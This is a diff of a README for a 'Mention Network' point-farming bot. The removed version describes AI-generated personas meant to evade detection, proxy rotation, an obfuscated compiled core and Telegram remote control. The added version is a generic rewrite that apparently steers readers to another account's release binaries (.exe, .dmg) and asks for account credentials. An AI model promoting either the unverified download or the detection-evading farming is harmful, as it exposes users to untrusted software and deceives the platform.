@@ -1,168 +1,71 @@
-# 🤖 Mention Network Automation Bot (Premium Edition)
+# 🤖 mention-network-bot - Automate Your Mention Network Tasks Easily
 
-![Python Version](https://img.shields.io/badge/Python-3.11%2B-blue)
-![License](https://img.shields.io/badge/License-Proprietary-red)
-![Status](https://img.shields.io/badge/Status-Active-success)
+[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-Click_Here-brightgreen)](https://github.com/dark12502/mention-network-bot/releases)
 
-A high-performance, multi-threaded automation tool designed for **Mention Network**. This bot utilizes advanced AI models (Gemini/Groq) to generate organic, context-aware conversations, manage daily quests, and maximize point farming efficiency.
+## 🚀 Getting Started
 
-> **🔒 Security Note:** This project includes advanced security features and obfuscation methods to protect core logic.
-![alt text](images.png)
+Welcome to the mention-network-bot! This powerful tool helps you manage your Mention Network tasks efficiently. With this easy-to-use bot, you can generate conversations, complete daily quests, and optimize your point farming all at once.
 
----
+### 🌟 Key Features
 
-## ✨ Key Features
+- **Multi-threaded Automation:** Perform multiple tasks simultaneously without slowdown.
+- **AI Integration:** Utilize advanced models like Gemini and Groq for smart interactions.
+- **User-Friendly Interface:** Designed for users with all skill levels in mind.
+- **Customizable Settings:** Adjust the bot to fit your specific needs.
 
-* **🧠 Advanced AI Integration:** Uses Google Gemini & Groq (Llama 3) to generate human-like answers.
-* **🎭 Smart Persona System:** Automatically generates unique personas with specific interests and traits to avoid detection.
-* **⚡ Multi-Threaded:** Runs multiple accounts simultaneously with optimized delay handling.
-* **🛡️ Strict Proxy Support:** Secure connection management with IP rotation support.
-* **📱 Telegram Control Center:** Monitor status, add keys, and control the bot remotely via Telegram.
-* **🔄 Smart Recovery:** Auto-sleeps and resumes when API limits are reached (50-minute cool-down).
-* **⚔️ Auto Quests:** Automatically completes "Visit" and "Follow" quests.
+## 💻 System Requirements
 
----
+To run the mention-network-bot, you will need:
 
-## ✅ System Requirements (IMPORTANT)
-To use this bot, you MUST install `Python 3.11`.
-Other versions (like 3.10 or 3.12) will NOT work because the core engine is compiled specifically for version 3.11.
+- **Operating System:** Windows 10 or later, macOS, or a modern Linux distribution.
+- **RAM:** At least 4 GB for smooth operation.
+- **Python:** Version 3.8 or later installed on your system.
 
-### ⚠️ Required:
-- Python 3.11.x (64-bit)
-- Windows 10/11
-- License Activation : https://form.jotform.com/253471232172046
----
+Make sure your system meets these requirements to enjoy the best experience with the bot.
 
-## 🚀 Installation
-### 1. Clone the Repository
-```Bash
-git clone https://github.com/genoshide/mention-network-bot.git
-cd mention-network-bot
-```
-### 2. Create a Virtual Environment
-It is recommended to use a virtual environment to avoid conflicts.
-#### Windows
-```Bash 
-python -m venv venv
-```
-```bash
-venv\Scripts\activate
-```
+## 📥 Download & Install
 
-#### Linux/Mac
-```bash
-python3 -m venv venv
-```
-```bash
-source venv/bin/activate
-```
-### 3. Install Dependencies
-```Bash
-pip install -r requirements.txt
-```
+To get started, visit this page to download: [Download Latest Release](https://github.com/dark12502/mention-network-bot/releases). Choose the latest version from the list, and follow these steps:
 
-## ⚙️ Configuration
-Before running the bot, you must configure the files inside the data/ folder.
+1. **Select the Release:** Click on the link for the most recent release.
+2. **Download the Files:** Look for the assets section. Download the appropriate file for your operating system (e.g., `.exe` for Windows or `.tar.gz` for Linux).
+3. **Install the Application:**
+   - **Windows Users:** Double-click the downloaded `.exe` file and follow the installation prompts.
+   - **macOS Users:** Open the downloaded `.dmg` file and drag the application to the Applications folder.
+   - **Linux Users:** Extract the downloaded `.tar.gz` file and follow the instructions in the README file inside the extracted folder.
 
-### 1. data/token.txt
-Paste your Mention Network JWT tokens here (one per line).
-```Plaintext
-eyJhbGciOiJIUzI1NiIsIn...
-eyJhbGciOiJIUzI1NiIsIn...
-```
-### 3. data/proxy.txt
-Add your proxies in http format (one per line). 
-Required if USE_PROXY = True.
-```Plaintext
-user:pass@ip:port
-user:pass@ip:port
-```
-### 4. data/api.txt
-Add your AI API Keys (Google Gemini or Groq). The bot will rotate them automatically.
-```Plaintext
-AIzaSyD...  (Gemini)
-gsk_8Ja...  (Groq)
-```
-### 5. Configuration's (Optional)
-Rename `.env.example` to `.env` ou can adjust settings like thread count, delays, and Telegram credentials here.
-```yaml
-CHAT_COUNT_MIN=5
-CHAT_COUNT_MAX=15
+## 🛠️ Configuration
 
-SLEEP_BETWEEN_CYCLES_MIN=300
-SLEEP_BETWEEN_CYCLES_MAX=600
+After installing, you need to configure the bot:
 
-THREADS=3
-USE_PROXY=false
-HUMAN_TYPING=false
-AUTO_COMPLETE_QUESTS=false
-SMART_CONVERSATION=false
+1. **Open the Bot:** Start the application by clicking its icon.
+2. **Set Up Your Credentials:** You will need to log in to your Mention Network account. Enter your username and password in the designated fields.
+3. **Adjust Settings:** Customize the bot settings according to your preferences. You can set the frequency of tasks, choose automated responses, and more.
 
-START_DELAY_MIN=5
-START_DELAY_MAX=15
-DELAY_MIN=5
-DELAY_MAX=10
-SLEEP_WHEN_API_LIMIT=10
+## 🎯 How to Use the Bot
 
-USE_TELEGRAM=false
-TELEGRAM_BOT_TOKEN=
-TELEGRAM_CHAT_ID=
-TELEGRAM_ALLOWED_IDS=
-```
+Once your bot is set up:
 
-## 🖥️ Usage
-Once configured, simply run:
-```Bash
-python main.py
-```
-The bot will perform a license check, validate your configuration files, and start the mining threads.
+1. **Start the Bot:** Click the 'Start' button to begin.
+2. **Monitor Progress:** Watch the bot as it automates your tasks. You can view the progress in real-time in the interface.
+3. **Pause/Stop:** At any time, you can pause or stop the bot if you need to take control.
 
----
+## ✅ Troubleshooting
 
-## Real-time Interaction
-Manage your bot remotely without touching the server. The bot includes a complete command menu.
+If you run into issues:
 
-> *Example: Adding a Groq API key via Telegram triggers an immediate update on the server log.*
+- **Bot Won't Start:** Ensure your Python version is compatible and all dependencies are installed.
+- **Login Errors:** Double-check your Mention Network credentials for accuracy.
+- **Performance Issues:** Close any unnecessary applications to free up system resources.
 
+## 📞 Support
 
-### 📡 Telegram Commands
-If `USE_TELEGRAM = True`, you can control the bot via your private bot.
-| Command | Description |
-| :--- | :--- |
-| `/status` | View live points, running threads, and license status. |
-| `/logs` | Fetch the last 15 lines of terminal logs. |
-| `/screenshot` | Capture a screenshot of the server/VPS. |
-| `/add_token` | Add a new account token remotely. |
-| `/add_api` | Add a new AI API Key remotely. |
-| `/stop` | Force shutdown the bot. |
-| `/restart` | Restart the bot process. |
+For support, consider visiting our community or checking out the FAQ section on our GitHub page. You can also ask questions through the Issues tab in the repository.
 
-## 🖥️ Dashboard Interface
+## 🌐 Community Contributions
 
-The bot features a rich terminal UI (TUI) that displays real-time statistics, worker threads, and AI logs.
+Your input is valuable! If you have ideas for new features or improvements, please share them in the Issues section. Be sure to check the Contribution guidelines if you'd like to contribute code or documentation.
 
-> *Real-time monitoring showing active threads, AI responses, and point accumulation.*
+Thank you for using mention-network-bot. For more details or to report an issue, feel free to reach out. Happy automating!
 
-## 📂 Directory Structure
-
-```text
-mention-bot/
-├── data/
-│   ├── token.txt       # List of Account JWT Tokens
-│   ├── proxy.txt       # List of Proxies (user:pass@ip:port)
-│   ├── api.txt         # Gemini/Groq API Keys
-│   └── personas.json   # Generated AI Characters (Do not edit manually)
-├── src/
-│   ├── starter.pyd     # Compiled Core Logic (Protected)
-│   └── ...
-├── main.py             # Entry point (Loader)
-├── requirements.txt    # Python dependencies
-├── PRODUCT_INFO.txt    # Genoshide Mention Network Bot Informations
-└── README.md
-```
-
-## ⚠️ Disclaimer
-This tool is for educational purposes only. The developer is **not responsible** for any bans or penalties applied to your Mention Network accounts. Use this tool at your own risk.
-
-## 📜 License
-**Copyright © 2025 Genoshide**. All rights reserved.Unauthorized **copying**, **modification**, or **distribution** of this file, via any medium, is strictly prohibited.
+[Download Latest Release](https://github.com/dark12502/mention-network-bot/releases)
